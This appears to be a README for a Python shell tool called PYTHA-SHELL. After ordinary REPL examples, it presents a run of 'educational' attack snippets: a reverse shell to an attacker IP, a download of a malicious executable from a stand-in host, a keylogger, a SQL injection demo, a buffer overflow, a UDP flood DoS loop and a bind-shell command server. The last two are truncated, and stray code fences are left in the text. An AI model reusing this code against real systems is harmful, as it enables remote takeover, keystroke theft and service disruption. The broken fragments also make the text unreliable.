## Usage

PYTHA-SHELL is a command-line tool for executing Python code and interacting with an advanced shell environment.

### Launch the Shell

```bash
python PythaShell.py
```

### Example Usage

1. **Start PYTHA-SHELL**:

    ```bash
    python PythaShell.py
    ```

    This command launches the interactive shell environment.

2. **Execute Python Code**:

    ```python
    >>> print("Hello, World!")
    Hello, World!
    ```

    This command executes the Python code and prints the result.

3. **Run a Python Script**:

    ```python
    >>> run('example_script.py')
    ```

    This command loads and runs the Python script `example_script.py`.

4. **Inspect a Variable**:

    ```python
    >>> x = 10
    >>> x
    10
    ```

    This command assigns the value `10` to variable `x` and prints its value.

5. **Set Breakpoints**:

    ```python
    >>> set_breakpoint()
    ```

    This command sets a breakpoint in the code for debugging.

6. **Inspect Variables**:

    ```python
    >>> inspect_variable('x')
    ```

    This command inspects the variable `x` and shows its current value.

7. **Use Autocompletion**:

    ```python
    >>> import math
    >>> math.pi
    ```

    Typing `math.` and using autocompletion will show available attributes like `pi`.

8. **Customizable Interface**:

    ```python
    >>> customize_interface(theme='dark')
    ```

    This command changes the shell interface to a dark theme.

9. **Educational Example - Reverse Shell Code**:

    ```python
    >>> # For educational purposes only. Be cautious and use responsibly.
    >>> import socket
    >>> import subprocess
    >>> import os
    >>> 
    >>> def reverse_shell():
    >>>     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    >>>     s.connect(('attacker_ip', 4444))  # Replace with the attacker's IP and port
    >>>     while True:
    >>>         command = s.recv(1024).decode('utf-8')
    >>>         if command.lower() == 'exit':
    >>>             break
    >>>         output = subprocess.getoutput(command)
    >>>         s.send(output.encode('utf-8'))
    >>>     s.close()
    >>> 
    >>> reverse_shell()
    ```

    **Description**: This code demonstrates a basic reverse shell, where the target machine connects back to an attacker's machine and executes commands received over the network. **Warning**: This is for educational purposes only. **Do not use this code maliciously** or without proper authorization. It’s meant to demonstrate how reverse shells work for learning and ethical hacking practice.

10. **Educational Example - Malicious File Download**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import urllib.request
    >>> url = 'http://malicious_website.com/malicious_file.exe'  # Replace with the malicious URL
    >>> save_path = 'malicious_file.exe'
    >>> urllib.request.urlretrieve(url, save_path)
    ```

    **Description**: This code snippet shows how to download a file from a given URL. In a malicious context, this could be used to download harmful files. **Do not use this code for malicious purposes**. It is included here for educational purposes to understand how such scripts operate.

11. **Educational Example - Keylogger Code**:

    ```python
    >>> # For educational purposes only. Be cautious with such code.
    >>> from pynput import keyboard
    >>> 
    >>> def on_press(key):
    >>>     try:
    >>>         with open('keylog.txt', 'a') as f:
    >>>             f.write(f'{key.char}')
    >>>     except AttributeError:
    >>>         with open('keylog.txt', 'a') as f:
    >>>             f.write(f'{key}')
    >>> 
    >>> with keyboard.Listener(on_press=on_press) as listener:
    >>>     listener.join()
    ```

    **Description**: This code demonstrates a simple keylogger that records keystrokes to a file. **Warning**: This is for educational purposes only. **Do not use this code to infringe on others' privacy**. It’s meant to illustrate how keyloggers function for learning and ethical hacking practice.

12. **Educational Example - SQL Injection Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import sqlite3
    >>> 
    >>> conn = sqlite3.connect(':memory:')
    >>> cursor = conn.cursor()
    >>> cursor.execute('CREATE TABLE users (username TEXT, password TEXT)')
    >>> cursor.execute('INSERT INTO users (username, password) VALUES (?, ?)', ('admin', 'admin123'))
    >>> 
    >>> user_input = "' OR '1'='1"
    >>> query = f"SELECT * FROM users WHERE username='{user_input}'"
    >>> cursor.execute(query)
    >>> results = cursor.fetchall()
    >>> print(results)
    ```

    **Description**: This code demonstrates a simple SQL injection simulation by manipulating a query string to bypass authentication. **Warning**: This is for educational purposes only. **Do not use this code to attack or compromise databases**. It’s meant to illustrate how SQL injection works for learning and ethical hacking practice.

13. **Educational Example - Buffer Overflow Simulation**:

    ```python
    >>> # For educational purposes only. Use responsibly.
    >>> import ctypes
    >>> 
    >>> def buffer_overflow():
    >>>     buf = ctypes.create_string_buffer(10)
    >>>     buf.value = b'A' * 20  # Overflow buffer with excessive data
    >>>     print(buf.value)
    >>> 
    >>> buffer_overflow()
    ```

    **Description**: This code demonstrates a buffer overflow by writing more data to a buffer than it can handle, potentially causing unexpected behavior. **Warning**: This is for educational purposes only. **Do not use this code to exploit vulnerabilities**. It’s meant to illustrate how buffer overflows work for learning and ethical hacking practice.

14. **Educational Example - Denial of Service (DoS) Simulation**:

    >>>     message = b'A' * 1024  # Large message to flood the target
    >>>     while True:
    >>>         sock.sendto(message, (target_ip, target_port))
    >>> 
    >>> dos_attack('target_ip', 80)  # Replace 'target_ip' with the target's IP address
    ```

    **Description**: This code demonstrates a simple denial of service (DoS) attack by flooding a target with a large number of messages. **Warning**: This is for educational purposes only. **Do not use this code to disrupt services**. It’s meant to illustrate how DoS attacks work for learning and ethical hacking practice.

    >>>     s.bind(('0.0.0.0', 9999))
    >>>     s.listen(1)
    >>>     print("Listening for connections...")
    >>>     conn, addr = s.accept()
    >>>     print(f"Connection from {addr}")
    >>>     while True:
    >>>         data = conn.recv(1024).decode('utf-8')
    >>>         if not data:
    >>>             break
    >>>         output = os.popen(data).read()
    >>>         conn.send(output.encode('utf-8'))
    >>>     conn.close()
    >>> 
    >>> remote_code_execution()
    ```
